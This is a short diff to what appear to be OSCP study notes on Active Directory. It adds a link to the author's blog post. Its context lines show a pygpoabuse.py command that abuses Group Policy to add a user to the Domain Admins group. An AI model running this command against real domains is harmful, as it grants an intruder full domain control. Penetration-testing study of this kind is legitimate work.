@@ -56,3 +56,7 @@ python3 pygpoabuse.py 'domain.com/user:password' \
 -dc-ip $target \
 -powershell 'net group "Domain Admins" User /add'
 ```
+
+## Links
+I go over it in more detail in a blog post:
+https://medium.com/@aaronashley466/oscp-notes-active-directory-and-pivoting-cheat-sheet-af42c46fd67b
